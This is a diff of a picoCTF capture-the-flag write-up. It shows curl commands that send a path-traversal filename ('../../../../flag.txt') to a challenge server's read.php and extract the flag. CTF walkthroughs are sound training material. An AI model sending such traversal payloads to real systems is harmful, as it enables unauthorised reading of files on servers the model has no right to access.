@@ -21,6 +21,8 @@ Here's the website.
 
     curl -d 'filename=../../../../flag.txt' http://saturn.picoctf.net:62822/read.php
 
+
+
     curl -d 'filename=../../../../flag.txt' http://saturn.picoctf.net:62822/read.php | grep -oE 'picoCTF{.*}' | tee >(xsel -b)
 
 ![](images/webpage_retrieveFlag.png)
